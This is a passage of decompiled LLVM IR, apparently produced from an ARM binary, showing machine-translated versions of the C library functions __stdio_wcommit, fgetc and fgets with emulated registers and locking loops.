  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 12, 13, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1, 10, 11, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 4, 0, 1, 2, 3, 9, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 0, 6, 2, 3, 4, 5, 7 }
  uselistorder label %dec_label_pc_14c90, { 1, 0 }
  uselistorder label %dec_label_pc_14c7c, { 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14c14, { 1, 0 }
  uselistorder label %dec_label_pc_14bf0, { 1, 0 }
  uselistorder label %dec_label_pc_14bd0, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14cc0 = load i32, i32* @r4, align 4
  store i32 %v3_14cc0, i32* %stack_var_-8, align 4
  %v1_14cc4 = add i32 %arg1, 8
  %v2_14cc4 = inttoptr i32 %v1_14cc4 to i32*
  %v3_14cc4 = load i32, i32* %v2_14cc4, align 4
  store i32 %v3_14cc4, i32* @r1, align 4
  %v1_14cc8 = add i32 %arg1, 16
  %v2_14cc8 = inttoptr i32 %v1_14cc8 to i32*
  %v3_14cc8 = load i32, i32* %v2_14cc8, align 4
  %v9_14ccc = icmp eq i32 %v3_14cc8, %v3_14cc4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br i1 %v9_14ccc, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_14cc4, i32* %v2_14cc8, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_14cd8 = xor i1 %v9_14ccc, true
  call void @__pseudo_cond_branch(i1 %v1_14cd8, i32 ptrtoint (i32* @global_var_16934.858 to i32))
  %v0_14cdc = load i32, i32* %r4.global-to-local, align 4
  %v1_14cdc = add i32 %v0_14cdc, 8
  %v2_14cdc = inttoptr i32 %v1_14cdc to i32*
  %v3_14cdc = load i32, i32* %v2_14cdc, align 4
  %v1_14ce0 = add i32 %v0_14cdc, 16
  %v2_14ce0 = inttoptr i32 %v1_14ce0 to i32*
  %v3_14ce0 = load i32, i32* %v2_14ce0, align 4
  %v2_14ce4 = sub i32 %v3_14ce0, %v3_14cdc
  %v2_14ce8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14ce8, i32* @r4, align 4
  ret i32 %v2_14ce4

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_14cf0 = load i32, i32* @r4, align 4
  store i32 %v3_14cf0, i32* %stack_var_-20, align 4
  %v6_14cf0 = load i32, i32* @r5, align 4
  %v9_14cf0 = load i32, i32* @r6, align 4
  %v12_14cf0 = load i32, i32* @r7, align 4
  %v15_14cf0 = load i32, i32* @lr, align 4
  %v1_14cf4 = add i32 %arg1, 52
  %v2_14cf4 = inttoptr i32 %v1_14cf4 to i32*
  %v3_14cf4 = load i32, i32* %v2_14cf4, align 4
  store i32 %v3_14cf4, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14cf8 = icmp eq i32 %v3_14cf4, 0
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_14cf8, label %dec_label_pc_14d2c, label %dec_label_pc_14d08

dec_label_pc_14d08:                               ; preds = %entry
  %v1_14d08 = add i32 %arg1, 16
  %v2_14d08 = inttoptr i32 %v1_14d08 to i32*
  %v3_14d08 = load i32, i32* %v2_14d08, align 4
  store i32 %v3_14d08, i32* %r2.global-to-local, align 4
  %v1_14d0c = add i32 %arg1, 24
  %v2_14d0c = inttoptr i32 %v1_14d0c to i32*
  %v3_14d0c = load i32, i32* %v2_14d0c, align 4
  store i32 %v3_14d0c, i32* %r3.global-to-local, align 4
  %v3_14d10 = icmp uge i32 %v3_14d08, %v3_14d0c
  store i1 %v3_14d10, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_14d10, label %dec_label_pc_14d20, label %.thread

.thread:                                          ; preds = %dec_label_pc_14d08
  %v2_14d14 = inttoptr i32 %v3_14d08 to i8*
  %v3_14d14 = load i8, i8* %v2_14d14, align 1
  %v4_14d14 = zext i8 %v3_14d14 to i32
  store i32 %v4_14d14, i32* %r5.global-to-local, align 4
  %v6_14d14 = add i32 %v3_14d08, 1
  store i32 %v6_14d14, i32* %r2.global-to-local, align 4
  store i32 %v6_14d14, i32* %v2_14d08, align 4
  br label %dec_label_pc_14e24

dec_label_pc_14d20:                               ; preds = %dec_label_pc_14d08
  %v1_14d20 = inttoptr i32 %arg1 to i16*
  %v2_14d20 = call i32 @getc_unlocked(i16* %v1_14d20)
  store i32 %v2_14d20, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14e24

dec_label_pc_14d2c:                               ; preds = %entry
  %v0_14d2c = call i32 @__aeabi_read_tp()
  %v0_14d30 = load i32, i32* @r7, align 4
  %v1_14d30 = add i32 %v0_14d30, 64
  %v2_14d30 = inttoptr i32 %v1_14d30 to i32*
  %v3_14d30 = load i32, i32* %v2_14d30, align 4
  store i32 %v3_14d30, i32* %r3.global-to-local, align 4
  %v1_14d34 = add i32 %v0_14d2c, -1168
  store i32 %v1_14d34, i32* @r6, align 4
  %v3_14d38 = icmp uge i32 %v3_14d30, %v1_14d34
  store i1 %v3_14d38, i1* %cpsr_c.global-to-local, align 1
  %v9_14d38 = icmp eq i32 %v3_14d30, %v1_14d34
  br i1 %v9_14d38, label %dec_label_pc_14d80, label %dec_label_pc_14d40

dec_label_pc_14d40:                               ; preds = %dec_label_pc_14d2c
  %v1_14d40 = add i32 %v0_14d30, 56
  store i32 %v1_14d40, i32* @r5, align 4
  store i32 %v1_14d40, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14d4c

dec_label_pc_14d4c:                               ; preds = %dec_label_pc_14d58.dec_label_pc_14d4c_crit_edge, %dec_label_pc_14d40
  %v0_14d4c = phi i32 [ %v0_14d4c.pre, %dec_label_pc_14d58.dec_label_pc_14d4c_crit_edge ], [ %v1_14d40, %dec_label_pc_14d40 ]
  %v1_14d4c = inttoptr i32 %v0_14d4c to i32*
  %v2_14d4c = load i32, i32* %v1_14d4c, align 4
  store i32 %v2_14d4c, i32* %r3.global-to-local, align 4
  %v1_14d50 = load i32, i32* @r4, align 4
  %v3_14d50 = icmp uge i32 %v2_14d4c, %v1_14d50
  store i1 %v3_14d50, i1* %cpsr_c.global-to-local, align 1
  %v9_14d50 = icmp eq i32 %v2_14d4c, %v1_14d50
  br i1 %v9_14d50, label %dec_label_pc_14d58, label %dec_label_pc_14d70

dec_label_pc_14d58:                               ; preds = %dec_label_pc_14d4c
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14d68 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14d68, label %dec_label_pc_14d6c, label %dec_label_pc_14d58.dec_label_pc_14d4c_crit_edge

dec_label_pc_14d58.dec_label_pc_14d4c_crit_edge:  ; preds = %dec_label_pc_14d58
  %v0_14d4c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14d4c

dec_label_pc_14d6c:                               ; preds = %dec_label_pc_14d58
  %v0_14d6c = load i32, i32* @r4, align 4
  store i32 %v0_14d6c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14d70

dec_label_pc_14d70:                               ; preds = %dec_label_pc_14d4c, %dec_label_pc_14d6c
  %v0_14d70 = phi i32 [ %v0_14d6c, %dec_label_pc_14d6c ], [ %v2_14d4c, %dec_label_pc_14d4c ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14d70 = icmp eq i32 %v0_14d70, 0
  br i1 %v2_14d70, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_14d70
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_14d70, %bb
  store i32 85372, i32* @lr, align 4
  %v1_14d78 = xor i1 %v2_14d70, true
  call void @__pseudo_cond_branch(i1 %v1_14d78, i32 ptrtoint (i32* @global_var_12a80.726 to i32))
  %v0_14d7c = load i32, i32* @r6, align 4
  %v1_14d7c = load i32, i32* @r7, align 4
  %v2_14d7c = add i32 %v1_14d7c, 64
  %v3_14d7c = inttoptr i32 %v2_14d7c to i32*
  store i32 %v0_14d7c, i32* %v3_14d7c, align 4
  %v0_14d80.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_14d80

dec_label_pc_14d80:                               ; preds = %dec_label_pc_14d2c, %bb18
  %v1_14d90 = phi i32 [ %v0_14d30, %dec_label_pc_14d2c ], [ %v0_14d80.pre, %bb18 ]
  %v1_14d80 = add i32 %v1_14d90, 60
  %v2_14d80 = inttoptr i32 %v1_14d80 to i32*
  %v3_14d80 = load i32, i32* %v2_14d80, align 4
  store i32 %v3_14d80, i32* %r2.global-to-local, align 4
  %v1_14d84 = add i32 %v1_14d90, 16
  %v2_14d84 = inttoptr i32 %v1_14d84 to i32*
  %v3_14d84 = load i32, i32* %v2_14d84, align 4
  store i32 %v3_14d84, i32* @r1, align 4
  %v1_14d88 = add i32 %v1_14d90, 24
  %v2_14d88 = inttoptr i32 %v1_14d88 to i32*
  %v3_14d88 = load i32, i32* %v2_14d88, align 4
  store i32 %v3_14d88, i32* %r3.global-to-local, align 4
  %v1_14d8c = add i32 %v3_14d80, 1
  store i32 %v1_14d8c, i32* %r2.global-to-local, align 4
  store i32 %v1_14d8c, i32* %v2_14d80, align 4
  %v0_14d94 = load i32, i32* @r1, align 4
  %v1_14d94 = load i32, i32* %r3.global-to-local, align 4
  %v3_14d94 = icmp uge i32 %v0_14d94, %v1_14d94
  store i1 %v3_14d94, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_14d94, label %dec_label_pc_14da4, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14d80
  %v2_14d98 = inttoptr i32 %v0_14d94 to i8*
  %v3_14d98 = load i8, i8* %v2_14d98, align 1
  %v4_14d98 = zext i8 %v3_14d98 to i32
  store i32 %v4_14d98, i32* %r5.global-to-local, align 4
  %v6_14d98 = add i32 %v0_14d94, 1
  store i32 %v6_14d98, i32* @r1, align 4
  %v2_14d9c = load i32, i32* @r7, align 4
  %v3_14d9c = add i32 %v2_14d9c, 16
  %v4_14d9c = inttoptr i32 %v3_14d9c to i32*
  store i32 %v6_14d98, i32* %v4_14d9c, align 4
  br label %dec_label_pc_14db0

dec_label_pc_14da4:                               ; preds = %dec_label_pc_14d80
  %v0_14da4 = load i32, i32* @r7, align 4
  %v1_14da8 = inttoptr i32 %v0_14da4 to i16*
  %v2_14da8 = call i32 @getc_unlocked(i16* %v1_14da8)
  store i32 %v2_14da8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14db0

dec_label_pc_14db0:                               ; preds = %.thread2, %dec_label_pc_14da4
  %v0_14db0 = load i32, i32* @r7, align 4
  %v1_14db0 = add i32 %v0_14db0, 60
  %v2_14db0 = inttoptr i32 %v1_14db0 to i32*
  %v3_14db0 = load i32, i32* %v2_14db0, align 4
  %v1_14db4 = add i32 %v3_14db0, -1
  store i32 %v1_14db4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14db8 = icmp eq i32 %v1_14db4, 0
  store i32 %v1_14db4, i32* %v2_14db0, align 4
  br i1 %v2_14db8, label %dec_label_pc_14dc4, label %dec_label_pc_14e24

dec_label_pc_14dc4:                               ; preds = %dec_label_pc_14db0
  %v0_14dc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_14dc4 = load i32, i32* @r7, align 4
  %v2_14dc4 = add i32 %v1_14dc4, 64
  %v3_14dc4 = inttoptr i32 %v2_14dc4 to i32*
  store i32 %v0_14dc4, i32* %v3_14dc4, align 4
  %v0_14dc8 = load i32, i32* @r7, align 4
  %v1_14dc8 = add i32 %v0_14dc8, 56
  store i32 %v1_14dc8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14dcc

dec_label_pc_14dcc:                               ; preds = %dec_label_pc_14dfc.dec_label_pc_14dcc_crit_edge, %dec_label_pc_14dc4
  %v0_14dd4 = phi i32 [ %v0_14dd4.pre, %dec_label_pc_14dfc.dec_label_pc_14dcc_crit_edge ], [ %v1_14dc8, %dec_label_pc_14dc4 ]
  %v0_14dcc = phi i32 [ %v0_14dcc.pre, %dec_label_pc_14dfc.dec_label_pc_14dcc_crit_edge ], [ %v0_14dc8, %dec_label_pc_14dc4 ]
  %v1_14dcc = add i32 %v0_14dcc, 56
  %v2_14dcc = inttoptr i32 %v1_14dcc to i32*
  %v3_14dcc = load i32, i32* %v2_14dcc, align 4
  store i32 %v3_14dcc, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_14dd4, i32* %r2.global-to-local, align 4
  %v1_14dd822 = inttoptr i32 %v0_14dd4 to i32*
  %v2_14dd823 = load i32, i32* %v1_14dd822, align 4
  store i32 %v2_14dd823, i32* %r3.global-to-local, align 4
  %v3_14ddc25 = icmp uge i32 %v2_14dd823, %v3_14dcc
  store i1 %v3_14ddc25, i1* %cpsr_c.global-to-local, align 1
  %v9_14ddc31 = icmp eq i32 %v2_14dd823, %v3_14dcc
  br i1 %v9_14ddc31, label %dec_label_pc_14de4, label %dec_label_pc_14dfc

dec_label_pc_14de4:                               ; preds = %dec_label_pc_14dcc, %dec_label_pc_14de4.dec_label_pc_14dd8_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14df4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14df4, label %dec_label_pc_14df8, label %dec_label_pc_14de4.dec_label_pc_14dd8_crit_edge

dec_label_pc_14de4.dec_label_pc_14dd8_crit_edge:  ; preds = %dec_label_pc_14de4
  %v0_14dd8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14ddc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14dd8 = inttoptr i32 %v0_14dd8.pre to i32*
  %v2_14dd8 = load i32, i32* %v1_14dd8, align 4
  store i32 %v2_14dd8, i32* %r3.global-to-local, align 4
  %v3_14ddc = icmp uge i32 %v2_14dd8, %v1_14ddc.pre
  store i1 %v3_14ddc, i1* %cpsr_c.global-to-local, align 1
  %v9_14ddc = icmp eq i32 %v2_14dd8, %v1_14ddc.pre
  br i1 %v9_14ddc, label %dec_label_pc_14de4, label %dec_label_pc_14dfc

dec_label_pc_14df8:                               ; preds = %dec_label_pc_14de4
  %v0_14df8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14df8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14dfc

dec_label_pc_14dfc:                               ; preds = %dec_label_pc_14dcc, %dec_label_pc_14de4.dec_label_pc_14dd8_crit_edge, %dec_label_pc_14df8
  %v0_14e04 = phi i32 [ %v0_14df8, %dec_label_pc_14df8 ], [ %v2_14dd823, %dec_label_pc_14dcc ], [ %v2_14dd8, %dec_label_pc_14de4.dec_label_pc_14dd8_crit_edge ]
  %v1_14dfc = phi i32 [ %v0_14df8, %dec_label_pc_14df8 ], [ %v3_14dcc, %dec_label_pc_14dcc ], [ %v1_14ddc.pre, %dec_label_pc_14de4.dec_label_pc_14dd8_crit_edge ]
  %v3_14dfc = icmp uge i32 %v0_14e04, %v1_14dfc
  store i1 %v3_14dfc, i1* %cpsr_c.global-to-local, align 1
  %v9_14dfc = icmp eq i32 %v0_14e04, %v1_14dfc
  br i1 %v9_14dfc, label %dec_label_pc_14e04, label %dec_label_pc_14dfc.dec_label_pc_14dcc_crit_edge

dec_label_pc_14dfc.dec_label_pc_14dcc_crit_edge:  ; preds = %dec_label_pc_14dfc
  %v0_14dcc.pre = load i32, i32* @r7, align 4
  %v0_14dd4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14dcc

dec_label_pc_14e04:                               ; preds = %dec_label_pc_14dfc
  %v2_14e04 = icmp ne i32 %v1_14dfc, 0
  store i1 %v2_14e04, i1* %cpsr_c.global-to-local, align 1
  %v7_14e08 = icmp slt i32 %v1_14dfc, 2
  br i1 %v7_14e08, label %dec_label_pc_14e24, label %dec_label_pc_14e0c

dec_label_pc_14e0c:                               ; preds = %dec_label_pc_14e04
  %v0_14e10 = load i32, i32* @r1, align 4
  %v1_14e10 = add i32 %v0_14e10, 129
  store i32 %v1_14e10, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14e24

dec_label_pc_14e24:                               ; preds = %.thread, %dec_label_pc_14db0, %dec_label_pc_14e0c, %dec_label_pc_14e04, %dec_label_pc_14d20
  %v0_14e24 = load i32, i32* %r5.global-to-local, align 4
  %v2_14e2c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_14e2c, i32* @r4, align 4
  store i32 %v6_14cf0, i32* @r5, align 4
  store i32 %v9_14cf0, i32* @r6, align 4
  store i32 %v12_14cf0, i32* @r7, align 4
  store i32 %v15_14cf0, i32* @lr, align 4
  ret i32 %v0_14e24

; uselistorder directives
  uselistorder i32 %v0_14df8, { 1, 0, 2 }
  uselistorder i32 %v1_14ddc.pre, { 0, 2, 1 }
  uselistorder i32 %v0_14d94, { 1, 0, 2 }
  uselistorder i32 %v1_14d90, { 0, 2, 1 }
  uselistorder i32 %v1_14d50, { 1, 0 }
  uselistorder i32 %v3_14d08, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 %arg1, { 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_14e24, { 2, 3, 1, 4, 0 }
  uselistorder label %dec_label_pc_14dfc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14de4, { 1, 0 }
  uselistorder label %dec_label_pc_14db0, { 1, 0 }
  uselistorder label %dec_label_pc_14d80, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_14d70, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_14e34 = load i32, i32* @r4, align 4
  store i32 %v3_14e34, i32* %stack_var_-32, align 4
  %v6_14e34 = load i32, i32* @r5, align 4
  %v9_14e34 = load i32, i32* @r6, align 4
  %v12_14e34 = load i32, i32* @r7, align 4
  %v15_14e34 = load i32, i32* @r8, align 4
  %v24_14e34 = load i32, i32* @lr, align 4
  %v1_14e38 = add i32 %arg3, 52
  %v2_14e38 = inttoptr i32 %v1_14e38 to i32*
  %v3_14e38 = load i32, i32* %v2_14e38, align 4
  store i32 %v3_14e38, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14e3c = icmp eq i32 %v3_14e38, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  br i1 %v2_14e3c, label %dec_label_pc_14e50, label %dec_label_pc_14eb4

dec_label_pc_14e50:                               ; preds = %entry
  %v0_14e50 = call i32 @__aeabi_read_tp()
  %v1_14e54 = add i32 %arg3, 64
  %v2_14e54 = inttoptr i32 %v1_14e54 to i32*
  %v3_14e54 = load i32, i32* %v2_14e54, align 4
  store i32 %v3_14e54, i32* %r3.global-to-local, align 4
  %v1_14e58 = add i32 %v0_14e50, -1168
  store i32 %v1_14e58, i32* @r8, align 4
  %v3_14e5c = icmp uge i32 %v3_14e54, %v1_14e58
  store i1 %v3_14e5c, i1* %cpsr_c.global-to-local, align 1
  %v9_14e5c = icmp eq i32 %v3_14e54, %v1_14e58
  br i1 %v9_14e5c, label %dec_label_pc_14ea8, label %dec_label_pc_14e64

dec_label_pc_14e64:                               ; preds = %dec_label_pc_14e50
  %v1_14e64 = add i32 %arg3, 56
  store i32 %v1_14e64, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_14e64, i32* %r2.global-to-local, align 4
  %v0_14e70 = load i32, i32* @r6, align 4
  store i32 %v0_14e70, i32* @r4, align 4
  %v1_14e7436 = inttoptr i32 %v1_14e64 to i32*
  %v2_14e7437 = load i32, i32* %v1_14e7436, align 4
  store i32 %v2_14e7437, i32* %r3.global-to-local, align 4
  %v3_14e7839 = icmp uge i32 %v2_14e7437, %v0_14e70
  store i1 %v3_14e7839, i1* %cpsr_c.global-to-local, align 1
  %v9_14e7845 = icmp eq i32 %v2_14e7437, %v0_14e70
  br i1 %v9_14e7845, label %dec_label_pc_14e80, label %dec_label_pc_14e98

dec_label_pc_14e80:                               ; preds = %dec_label_pc_14e64, %dec_label_pc_14e80.dec_label_pc_14e74_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14e90 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14e90, label %dec_label_pc_14e94, label %dec_label_pc_14e80.dec_label_pc_14e74_crit_edge

dec_label_pc_14e80.dec_label_pc_14e74_crit_edge:  ; preds = %dec_label_pc_14e80
  %v0_14e74.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14e78.pre = load i32, i32* @r4, align 4
  %v1_14e74 = inttoptr i32 %v0_14e74.pre to i32*
  %v2_14e74 = load i32, i32* %v1_14e74, align 4
  store i32 %v2_14e74, i32* %r3.global-to-local, align 4
  %v3_14e78 = icmp uge i32 %v2_14e74, %v1_14e78.pre
  store i1 %v3_14e78, i1* %cpsr_c.global-to-local, align 1
  %v9_14e78 = icmp eq i32 %v2_14e74, %v1_14e78.pre
  br i1 %v9_14e78, label %dec_label_pc_14e80, label %dec_label_pc_14e98

dec_label_pc_14e94:                               ; preds = %dec_label_pc_14e80
  %v0_14e94 = load i32, i32* @r4, align 4
  store i32 %v0_14e94, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14e98

dec_label_pc_14e98:                               ; preds = %dec_label_pc_14e64, %dec_label_pc_14e80.dec_label_pc_14e74_crit_edge, %dec_label_pc_14e94
  %v0_14e98 = phi i32 [ %v0_14e94, %dec_label_pc_14e94 ], [ %v2_14e7437, %dec_label_pc_14e64 ], [ %v2_14e74, %dec_label_pc_14e80.dec_label_pc_14e74_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14e98 = icmp eq i32 %v0_14e98, 0
  br i1 %v2_14e98, label %bb20, label %bb

bb:                                               ; preds = %dec_label_pc_14e98
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_14e98, %bb
  store i32 85668, i32* @lr, align 4
  %v1_14ea0 = xor i1 %v2_14e98, true
  call void @__pseudo_cond_branch(i1 %v1_14ea0, i32 ptrtoint (i32* @global_var_12a80.726 to i32))
  %v0_14ea4 = load i32, i32* @r8, align 4
  %v1_14ea4 = load i32, i32* @r7, align 4
  %v2_14ea4 = add i32 %v1_14ea4, 64
  %v3_14ea4 = inttoptr i32 %v2_14ea4 to i32*
  store i32 %v0_14ea4, i32* %v3_14ea4, align 4
  br label %dec_label_pc_14ea8

dec_label_pc_14ea8:                               ; preds = %dec_label_pc_14e50, %bb20
  %v0_14ea8 = load i32, i32* @r7, align 4
  %v1_14ea8 = add i32 %v0_14ea8, 60
  %v2_14ea8 = inttoptr i32 %v1_14ea8 to i32*
  %v3_14ea8 = load i32, i32* %v2_14ea8, align 4
  %v1_14eac = add i32 %v3_14ea8, 1
  store i32 %v1_14eac, i32* %r3.global-to-local, align 4
  store i32 %v1_14eac, i32* %v2_14ea8, align 4
  %v0_14eb4.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_14eb8.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_14ebc.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_14eb4

dec_label_pc_14eb4:                               ; preds = %entry, %dec_label_pc_14ea8
  %v0_14ebc = phi i32 [ %arg3, %entry ], [ %v0_14ebc.pre, %dec_label_pc_14ea8 ]
  %v0_14eb8 = phi i32 [ %arg2, %entry ], [ %v0_14eb8.pre, %dec_label_pc_14ea8 ]
  %v0_14eb4 = phi i32 [ %arg1, %entry ], [ %v0_14eb4.pre, %dec_label_pc_14ea8 ]
  store i32 %v0_14eb8, i32* %r1.global-to-local, align 4
  store i32 %v0_14ebc, i32* %r2.global-to-local, align 4
  %v3_14ec0 = inttoptr i32 %v0_14eb4 to i8*
  %v4_14ec0 = call i32 @__GI_fgets_unlocked(i8* %v3_14ec0, i32 %v0_14eb8, i32 %v0_14ebc)
  %v0_14ec4 = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14ec4 = icmp eq i32 %v0_14ec4, 0
  store i32 %v4_14ec0, i32* %r8.global-to-local, align 4
  br i1 %v2_14ec4, label %dec_label_pc_14ed0, label %dec_label_pc_14f44

dec_label_pc_14ed0:                               ; preds = %dec_label_pc_14eb4
  %v0_14ed0 = load i32, i32* @r7, align 4
  %v1_14ed0 = add i32 %v0_14ed0, 60
  %v2_14ed0 = inttoptr i32 %v1_14ed0 to i32*
  %v3_14ed0 = load i32, i32* %v2_14ed0, align 4
  %v1_14ed4 = add i32 %v3_14ed0, -1
  store i32 %v1_14ed4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14ed8 = icmp eq i32 %v1_14ed4, 0
  store i32 %v1_14ed4, i32* %v2_14ed0, align 4
  br i1 %v2_14ed8, label %dec_label_pc_14ee4, label %dec_label_pc_14f44

dec_label_pc_14ee4:                               ; preds = %dec_label_pc_14ed0
  %v0_14ee4 = load i32, i32* %r3.global-to-local, align 4
  %v1_14ee4 = load i32, i32* @r7, align 4
  %v2_14ee4 = add i32 %v1_14ee4, 64
  %v3_14ee4 = inttoptr i32 %v2_14ee4 to i32*
  store i32 %v0_14ee4, i32* %v3_14ee4, align 4
  %v0_14ee8 = load i32, i32* @r7, align 4
  %v1_14ee8 = add i32 %v0_14ee8, 56
  store i32 %v1_14ee8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14eec

dec_label_pc_14eec:                               ; preds = %dec_label_pc_14f1c.dec_label_pc_14eec_crit_edge, %dec_label_pc_14ee4
  %v0_14ef4 = phi i32 [ %v0_14ef4.pre, %dec_label_pc_14f1c.dec_label_pc_14eec_crit_edge ], [ %v1_14ee8, %dec_label_pc_14ee4 ]
  %v0_14eec = phi i32 [ %v0_14eec.pre, %dec_label_pc_14f1c.dec_label_pc_14eec_crit_edge ], [ %v0_14ee8, %dec_label_pc_14ee4 ]
  %v1_14eec = add i32 %v0_14eec, 56
  %v2_14eec = inttoptr i32 %v1_14eec to i32*
  %v3_14eec = load i32, i32* %v2_14eec, align 4
  store i32 %v3_14eec, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_14ef4, i32* %r2.global-to-local, align 4
  %v1_14ef824 = inttoptr i32 %v0_14ef4 to i32*
  %v2_14ef825 = load i32, i32* %v1_14ef824, align 4
  store i32 %v2_14ef825, i32* %r3.global-to-local, align 4
  %v3_14efc27 = icmp uge i32 %v2_14ef825, %v3_14eec
  store i1 %v3_14efc27, i1* %cpsr_c.global-to-local, align 1
  %v9_14efc33 = icmp eq i32 %v2_14ef825, %v3_14eec
  br i1 %v9_14efc33, label %dec_label_pc_14f04, label %dec_label_pc_14f1c

dec_label_pc_14f04:                               ; preds = %dec_label_pc_14eec, %dec_label_pc_14f04.dec_label_pc_14ef8_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14f14 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14f14, label %dec_label_pc_14f18, label %dec_label_pc_14f04.dec_label_pc_14ef8_crit_edge

dec_label_pc_14f04.dec_label_pc_14ef8_crit_edge:  ; preds = %dec_label_pc_14f04
  %v0_14ef8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14efc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14ef8 = inttoptr i32 %v0_14ef8.pre to i32*
  %v2_14ef8 = load i32, i32* %v1_14ef8, align 4
  store i32 %v2_14ef8, i32* %r3.global-to-local, align 4
  %v3_14efc = icmp uge i32 %v2_14ef8, %v1_14efc.pre
  store i1 %v3_14efc, i1* %cpsr_c.global-to-local, align 1
  %v9_14efc = icmp eq i32 %v2_14ef8, %v1_14efc.pre
